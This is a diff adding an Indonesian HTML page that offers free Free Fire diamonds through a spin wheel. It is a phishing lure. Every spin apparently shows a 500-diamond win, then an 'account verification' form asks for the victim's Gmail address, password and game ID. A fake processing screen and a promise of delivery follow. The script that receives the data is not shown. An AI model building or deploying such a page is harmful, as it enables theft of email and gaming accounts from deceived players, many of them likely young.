@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spin Wheel Diamond Free Fire</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+  
+<div class="bg-overlay"></div>
+<div class="container">
+  <div class="header">  
+    <h1>Spin & Menangkan <span class="diamond-text">Diamond</span> Free Fire!</h1>
+    <p class="subtitle">Putar roda dan klaim hadiahmu sekarang juga</p>
+  </div>
+
+  <div class="diamond-strip">
+    <span>💎</span><span>💎</span><span>💎</span><span>💎</span><span>💎</span>
+  </div>
+
+  <div class="wheel-wrapper">
+    <canvas id="wheel" width="400" height="400"></canvas>
+    <button id="spinBtn">SPIN</button>
+  </div>
+  <p id="status">Tekan SPIN untuk mencoba keberuntunganmu!</p>
+</div>
+
+<div id="modal" class="modal hidden">
+  <div class="modal-content">
+    <div class="diamond-big">💎</div>
+    <h2>🎉 SELAMAT! 🎉</h2>
+    <p>Kamu mendapatkan <span id="prizeAmount" class="prize">500</span> Diamond!</p>
+    <button id="claimBtn">CLAIM SEKARANG</button>
+  </div>
+</div>
+
+<div id="formModal" class="modal hidden">
+  <div class="modal-content">
+    <h2>Verifikasi Akun Free Fire</h2>
+    <p>Masukkan data akun untuk mengklaim hadiah</p>
+    <input type="email" id="emailInput" placeholder="Masukkan Gmail">
+    <input type="password" id="passInput" placeholder="Masukkan Password">
+    <input type="text" id="ffIdInput" placeholder="Masukkan ID Free Fire">
+    <button id="submitBtn">KLAIM DIAMOND</button>
+    <p id="formError" class="error hidden">Isi semua data dengan benar!</p>
+  </div>
+</div>
+
+<div id="loadingModal" class="modal hidden">
+  <div class="modal-content">
+    <h2>Memproses...</h2>
+    <div class="spinner"></div>
+    <p>Sedang memverifikasi akun kamu</p>
+  </div>
+</div>
+
+<div id="finalModal" class="modal hidden">
+  <div class="modal-content">
+    <div class="diamond-big">✅</div>
+    <h2>Berhasil!</h2>
+    <p>Diamond akan segera dikirim dalam waktu 10 menit ke akun kamu.</p>
+    <button id="okBtn">OK</button>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+  </html>
